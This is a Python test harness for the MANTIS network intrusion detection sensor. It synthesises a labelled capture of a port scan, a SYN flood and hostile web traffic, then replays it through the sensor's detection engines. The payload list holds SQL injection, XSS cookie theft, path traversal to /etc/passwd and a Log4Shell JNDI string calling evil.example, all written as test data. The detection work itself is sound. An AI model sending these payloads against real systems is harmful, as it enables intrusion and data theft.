#!/usr/bin/env python3
"""Offline PCAP replay harness for MANTIS.

Chapter 3 commits to evaluating the sensor with "offline PCAP replays" in
addition to live-fire testing. This tool provides that path: it reads a
capture file and pushes every frame through the *same* PacketParser and the
*same* five detection engines the live sensor uses, then reports which engines
fired.

Why this matters for the evaluation:

    * Reproducibility - a live `hping3` flood is never twice the same, so
      metrics taken from it cannot be re-derived by a marker. Replaying a fixed
      capture yields byte-identical results on every run.
    * No privileges - replay needs no root, no raw socket and no attack
      traffic, so the detection pipeline can be demonstrated and marked on any
      machine, including one where AF_PACKET is unavailable.
    * Falsifiability - the capture can be opened independently in Wireshark to
      confirm that the traffic really contains what MANTIS claims it detected.

Two modes:

    --generate FILE   synthesise a labelled attack scenario capture
    --pcap FILE       replay a capture through the engines and report

Standard library only.
"""

import argparse
import json
import os
import struct
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
if HERE not in sys.path:
    sys.path.insert(0, HERE)

import engines.bloom as bloom
import engines.kmeans as kmeans
import engines.knn as knn
import engines.naive_bayes as naive_bayes
import engines.z_score as z_score
import sensor_node.parser as parser_mod
import utils.mitre as mitre
import utils.pcap as pcap
from utils.config import CONFIG


# --------------------------------------------------------------------------
# scenario generator
# --------------------------------------------------------------------------
def generate_scenario(path, blacklist_ip="10.0.0.66"):
    """Write a synthetic capture containing four distinct attack phases.

    The phases are chosen so that each detection engine has something to find,
    which makes the replay a single-command demonstration of the whole
    ensemble:

        phase 1  baseline browsing      -> no alert (specificity check)
        phase 2  horizontal port scan   -> KNN
        phase 3  sustained SYN flood    -> Z-Score
        phase 4  SQLi + XSS payloads    -> Naive Bayes
        phase 5  known-bad source IP    -> Bloom Filter
    """
    base_ts = time.time()
    phases = []
    writer = pcap.PcapWriter(path, snaplen=200)

    def emit(frame, second, index, per_second):
        writer.write(frame, ts=base_ts + second + (index / float(per_second)),
                     orig_len=len(frame))

    # phase 1: 15 seconds of ordinary browsing, ~10 pps over a few ports
    for second in range(0, 15):
        for i in range(10):
            port = [80, 443, 53, 22][i % 4]
            emit(parser_mod.build_tcp(sport=40000 + i, dport=port,
                                     flags=0x18, data=b"GET /index.html HTTP/1.1",
                                     src="192.168.1.50"), second, i, 10)
    phases.append(("baseline browsing", "0-14s", "no alert expected"))

    # phase 2: horizontal port scan, 200 distinct destination ports per second
    for second in range(15, 20):
        for i in range(200):
            emit(parser_mod.build_tcp(sport=50000, dport=1 + i, flags=0x02,
                                     src="192.168.1.66"), second, i, 200)
    phases.append(("port scan", "15-19s", "KNN -> Scan"))

    # phase 3: SYN flood at 1500 pps against a single port
    for second in range(20, 28):
        for i in range(1500):
            emit(parser_mod.build_tcp(sport=1024 + (i % 60000), dport=80,
                                     flags=0x02, src="192.168.1.99"),
                 second, i, 1500)
    phases.append(("SYN flood", "20-27s", "Z-Score -> DDoS"))

    # phase 4: web application payloads
    payloads = [
        b"GET /?id=1 UNION SELECT username,password FROM users -- HTTP/1.1",
        b"GET /?q=<svg onerror=alert(document.cookie)> HTTP/1.1",
        b"GET /?file=../../../etc/passwd HTTP/1.1",
        b"POST /api {\"x\":\"${jndi:ldap://evil.example/a}\"} HTTP/1.1",
    ]
    for i, payload in enumerate(payloads):
        emit(parser_mod.build_tcp(sport=41000 + i, dport=80, flags=0x18,
                                 data=payload, src="192.168.1.77"),
             28, i, len(payloads))
    phases.append(("web payloads", "28s", "Naive Bayes -> Malicious"))

    # phase 5: traffic from a blacklisted source
    for i in range(5):
        emit(parser_mod.build_tcp(sport=6000 + i, dport=445, flags=0x02,
                                 src=blacklist_ip), 29, i, 5)
    phases.append(("known-bad IP", "29s", "Bloom Filter -> Blacklisted"))

    writer.close()
    print("[+] wrote %s (%d packets, opens in Wireshark)"
          % (path, writer.count))
    print("\n    phase                 window     expected detection")
    print("    " + "-" * 58)
    for name, window, expected in phases:
        print("    %-21s %-10s %s" % (name, window, expected))
    return writer.count


# --------------------------------------------------------------------------
# replay
# --------------------------------------------------------------------------
class ReplayEngine:
    """Runs the full engine ensemble over decoded packets, second by second."""

    def __init__(self, config=CONFIG, blacklist=None):
        self.config = config
        self.parser = parser_mod.PacketParser()

        self.stats_engine = z_score.MinimalistStats(
            window_size=config.zscore_window,
            threshold=config.zscore_threshold,
            min_pps=config.ddos_min_pps,
            required_consecutive=config.ddos_consecutive_intervals)
        self.knn_engine = knn.KNNMonitor(k=config.knn_k)
        self.payload_engine = naive_bayes.PayloadMonitor()
        self.kmeans_engine = kmeans.KMeansMonitor(
            k=config.kmeans_k, learning_rate=config.kmeans_alpha)
        self.blacklist = bloom.BloomFilter(size=config.bloom_size,
                                           hash_count=config.bloom_hashes)
        for ip in (blacklist or ["192.168.1.200", "10.0.0.66"]):
            self.blacklist.add(ip)

        self.alerts = []
        self.scan_active_sources = set()
        self.counts = {"packets": 0, "TCP": 0, "UDP": 0, "ICMP": 0, "OTHER": 0}
        self.engine_hits = {"z_score": 0, "knn": 0, "naive_bayes": 0,
                            "kmeans": 0, "bloom": 0}

    def _alert(self, second, engine, message, confidence=None, src=None):
        meta = mitre.enrich(message, confidence)
        self.engine_hits[engine] = self.engine_hits.get(engine, 0) + 1
        self.alerts.append({
            "t": round(second, 3),
            "engine": engine,
            "src": src,
            "message": message,
            "technique_id": meta["technique_id"],
            "tactic": meta["tactic"],
            "severity": meta["severity"],
            "risk_score": meta["risk_score"],
        })

    def run(self, path, verbose=True):
        reader = pcap.PcapReader(path)
        first_ts = None
        current_second = None
        packet_count = 0
        unique_ports = set()
        source_stats = {}

        for ts, raw, _orig_len in reader:
            if first_ts is None:
                first_ts = ts
            rel = ts - first_ts
            second = int(rel)

            # ---- second boundary: run the per-interval engines ----
            if current_second is None:
                current_second = second
            while second > current_second:
                self._close_second(
                    current_second, packet_count, unique_ports, source_stats)
                packet_count = 0
                unique_ports = set()
                source_stats = {}
                current_second += 1

            pkt = self.parser.parse(raw)
            if pkt is None:
                continue

            self.counts["packets"] += 1
            self.counts[pkt["proto"]] = self.counts.get(pkt["proto"], 0) + 1
            packet_count += 1
            source_observation = source_stats.setdefault(
                pkt["src"], {"packets": 0, "ports": set()})
            source_observation["packets"] += 1

            # Bloom reputation check
            if self.blacklist.check(pkt["src"]):
                verdict = self.blacklist.analyse(pkt["src"])
                self._alert(rel, "bloom",
                            "BLACKLISTED IP DETECTED: %s (Flagged)" % pkt["src"],
                            verdict.confidence, pkt["src"])
                continue

            if pkt["dport"]:
                unique_ports.add(pkt["dport"])
                source_observation["ports"].add(pkt["dport"])

            # Naive Bayes payload inspection
            if pkt["payload"]:
                verdict = self.payload_engine.analyse(pkt["payload"])
                if verdict.is_threat:
                    self._alert(rel, "naive_bayes",
                                "MALICIOUS PAYLOAD! Confidence: %.2f%% Keywords: %s"
                                % (verdict.confidence * 100,
                                   verdict.detail["keywords"]),
                                verdict.confidence, pkt["src"])

        reader.close()
        if current_second is not None:
            self._close_second(
                current_second, packet_count, unique_ports, source_stats)
        return self.report(verbose=verbose)

    def _close_second(self, second, packet_count, unique_ports, source_stats):
        """Run the interval engines for one completed second."""
        if packet_count == 0:
            return
        ports = len(unique_ports)
        dominant_src = self._dominant_source(source_stats, packet_count)

        zv = self.stats_engine.analyse(packet_count)
        if zv.detail["new_threat"]:
            self._alert(second, "z_score",
                        "DDoS DETECTED! Z-Score: %.2f (PPS: %d)"
                        % (zv.detail["z_score"], packet_count), zv.confidence,
                        dominant_src)

        current_scan_sources = set()
        for src, observation in source_stats.items():
            src_ports = len(observation["ports"])
            kv = self.knn_engine.analyse(
                src_ports, observation["packets"])
            if kv.is_threat:
                current_scan_sources.add(src)
                if src not in self.scan_active_sources:
                    self._alert(
                        second, "knn",
                        "PORT SCAN DETECTED! (Unique Ports: %d/sec)"
                        % src_ports,
                        kv.confidence, src)
        self.scan_active_sources = current_scan_sources

        cv = self.kmeans_engine.analyse(packet_count, ports)
        if cv.is_threat and not current_scan_sources and not zv.is_threat:
            self._alert(second, "kmeans",
                        "ANOMALY DETECTED (Cluster %d)! Suspicious activity."
                        % cv.detail["cluster"], cv.confidence, dominant_src)

    def _dominant_source(self, source_stats, total_packets):
        if not source_stats or total_packets <= 0:
            return None
        src, observation = max(
            source_stats.items(),
            key=lambda item: item[1].get("packets", 0))
        share = observation.get("packets", 0) / float(total_packets)
        threshold = max(
            0.0, min(1.0, float(getattr(
                self.config, "source_attribution_min_share", 0.50))))
        return src if share >= threshold else None

    def report(self, verbose=True):
        summary = {
            "packets": self.counts["packets"],
            "protocols": {k: v for k, v in self.counts.items()
                          if k != "packets"},
            "parser": self.parser.stats(),
            "engine_hits": self.engine_hits,
            "alerts": self.alerts,
        }
        if not verbose:
            return summary

        print("\n" + "=" * 66)
        print("  MANTIS Offline Replay Report")
        print("=" * 66)
        print("  packets decoded : %d" % self.counts["packets"])
        print("  protocol mix    : TCP=%d UDP=%d ICMP=%d OTHER=%d"
              % (self.counts.get("TCP", 0), self.counts.get("UDP", 0),
                 self.counts.get("ICMP", 0), self.counts.get("OTHER", 0)))
        print("  parser drops    : non-IPv4=%d malformed=%d"
              % (self.parser.dropped_non_ipv4, self.parser.dropped_malformed))
        print("\n  engine detections")
        print("  " + "-" * 62)
        labels = {
            "z_score": "Z-Score       (volumetric flood)",
            "knn": "KNN           (port scan)",
            "naive_bayes": "Naive Bayes   (payload)",
            "kmeans": "K-Means       (behavioural drift)",
            "bloom": "Bloom Filter  (reputation)",
        }
        for key, label in labels.items():
            hits = self.engine_hits.get(key, 0)
            mark = "FIRED" if hits else "  -  "
            print("  [%s] %-34s %5d alerts" % (mark, label, hits))

        if self.alerts:
            print("\n  alert timeline (first 15)")
            print("  " + "-" * 62)
            print("  %-7s %-12s %-9s %-6s %s"
                  % ("t(s)", "technique", "severity", "risk", "detail"))
            for a in self.alerts[:15]:
                print("  %-7.2f %-12s %-9s %-6.1f %s"
                      % (a["t"], a["technique_id"], a["severity"],
                         a["risk_score"], a["message"][:44]))
            if len(self.alerts) > 15:
                print("  ... %d more alerts" % (len(self.alerts) - 15))
        print("=" * 66)
        return summary


def parse_args(argv=None):
    p = argparse.ArgumentParser(
        prog="mantis-replay",
        description="replay a pcap through the MANTIS detection engines")
    p.add_argument("--pcap", help="capture file to replay")
    p.add_argument("--generate", metavar="FILE",
                   help="write a synthetic attack-scenario capture and exit")
    p.add_argument("--out-json", help="write the replay report as JSON")
    p.add_argument("--quiet", action="store_true")
    return p.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)

    if args.generate:
        generate_scenario(args.generate)
        return 0

    if not args.pcap:
        print("[!] give --pcap FILE or --generate FILE (see --help)")
        return 2
    if not os.path.isfile(args.pcap):
        print("[!] no such capture:", args.pcap)
        return 2

    engine = ReplayEngine()
    started = time.time()
    summary = engine.run(args.pcap, verbose=not args.quiet)
    elapsed = time.time() - started
    summary["replay_seconds"] = round(elapsed, 3)
    if summary["packets"]:
        summary["packets_per_second"] = int(summary["packets"] / max(elapsed, 1e-9))
        if not args.quiet:
            print("  replayed %d packets in %.2fs (%d pkt/s decode rate)"
                  % (summary["packets"], elapsed,
                     summary["packets_per_second"]))

    if args.out_json:
        with open(args.out_json, "w", encoding="utf-8") as f:
            json.dump(summary, f, indent=2)
        print("[+] wrote", args.out_json)
    return 0


if __name__ == "__main__":
    sys.exit(main())
